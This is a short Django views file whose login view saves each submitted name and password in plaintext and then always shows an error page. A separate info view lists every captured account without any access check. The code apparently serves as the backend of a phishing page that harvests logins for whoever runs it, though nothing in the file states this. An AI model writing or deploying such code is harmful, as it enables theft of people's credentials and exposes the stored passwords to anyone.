from django.shortcuts import render

from .models import Info

# Create your views here.
def index(request):
    return render(request, "page/index.html")

def login(request):
    if request.method == "POST":
        name = request.POST['name']
        password = request.POST['password']
        post = Info(name=name, password=password)
        post.save()
        return render(request, "page/error.html")
    else:
        return render(request, "page/error.html")

def info(request):
    return render(request, "page/info.html", {
        "accounts": Info.objects.all()
    })